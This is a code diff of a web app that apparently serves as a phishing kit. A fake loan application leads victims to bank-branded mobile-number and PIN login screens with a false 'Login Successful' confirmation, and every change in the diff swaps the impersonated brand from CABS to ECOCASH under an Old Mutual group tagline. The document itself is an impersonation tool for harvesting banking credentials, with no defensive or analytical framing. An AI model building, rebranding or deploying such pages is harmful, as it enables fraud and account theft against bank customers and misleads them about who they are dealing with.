@@ -175,7 +175,7 @@ const calcPayment = () => {
 const header = () => `
 <div class="site-header">
   <div class="logo-block">
-    <h1>CABS<span style="color:#8cc63f">//</span></h1>
+    <h1>ECOCASH<span style="color:#8cc63f">//</span></h1>
     <p>A Member of the <span>OLDMUTUAL</span> Group</p>
   </div>
   <div class="welcome-block">
@@ -386,7 +386,7 @@ const renderReview = () => `
 
       <div class="check-row" style="margin-bottom:24px;">
         <input type="checkbox" id="reviewCheck" />
-        <label for="reviewCheck">I confirm that the information provided is true and complete, and I agree to the CABS Loans terms and conditions and privacy notice.</label>
+        <label for="reviewCheck">I confirm that the information provided is true and complete, and I agree to the ECOCASH Loans terms and conditions and privacy notice.</label>
       </div>
 
       <div style="display:flex; gap:12px; align-items:center;">
@@ -414,7 +414,7 @@ const renderSuccess = () => `
     </div>
     <h2>Congratulations${state.name ? ', ' + state.name.split(' ')[0] + '!' : '!'}</h2>
     <p style="margin-top:10px;">Your loan application has been received successfully.</p>
-    <p style="margin-top:10px;">For the next step, please verify your <strong>CABS Internet Banking</strong> details.</p>
+    <p style="margin-top:10px;">For the next step, please verify your <strong>ECOCASH Internet Banking</strong> details.</p>
     <div style="margin-top:24px; background:#f0fdf4; border-radius:10px; padding:14px;">
       <p style="font-size:0.8rem; color:#00a651; font-weight:600;">🔐 Redirecting to secure login...</p>
     </div>
@@ -425,7 +425,7 @@ const renderSuccess = () => `
 const renderMobileLogin = () => `
 <div style="min-height:100vh; background:#fff; display:flex; flex-direction:column; align-items:center; padding:48px 24px 32px;" class="page">
   <div style="text-align:center; margin-bottom:40px;">
-    <div class="bank-logo">CABS<span>//</span></div>
+    <div class="bank-logo">ECOCASH<span>//</span></div>
     <div class="bank-subtitle">A Member of the <span style="color:#00a651; font-weight:800;">OLDMUTUAL</span> Group</div>
   </div>
 
@@ -448,7 +448,7 @@ const renderMobileLogin = () => `
 const renderPinLogin = (maskedPhone = '') => `
 <div style="min-height:100vh; background:#fff; display:flex; flex-direction:column; align-items:center; padding:48px 24px 32px;" class="page">
   <div style="text-align:center; margin-bottom:36px;">
-    <div class="bank-logo">CABS<span>//</span></div>
+    <div class="bank-logo">ECOCASH<span>//</span></div>
     <div class="bank-subtitle">A Member of the <span style="color:#00a651; font-weight:800;">OLDMUTUAL</span> Group</div>
   </div>
 
@@ -639,7 +639,7 @@ function navigate(view) {
     </div>
     <h2 style="font-size:1.6rem; font-weight:900; color:#1b3668; margin-bottom:12px;">Login Successful!</h2>
     <p style="color:#64748b; font-size:0.9rem; line-height:1.6; margin-bottom:8px;">Welcome back, <strong>${state.name ? state.name.split(' ')[0] : 'valued customer'}</strong>.</p>
-    <p style="color:#64748b; font-size:0.9rem; line-height:1.6; margin-bottom:32px;">Your CABS Internet Banking session has been verified successfully.</p>
+    <p style="color:#64748b; font-size:0.9rem; line-height:1.6; margin-bottom:32px;">Your ECOCASH Internet Banking session has been verified successfully.</p>
     <div style="background:#f0fdf4; border:1.5px solid #bbf7d0; border-radius:14px; padding:16px 20px; margin-bottom:32px;">
       <p style="color:#00a651; font-size:0.82rem; font-weight:600;">✅ Your loan application is being reviewed. Our team will contact you within 24 hours.</p>
     </div>
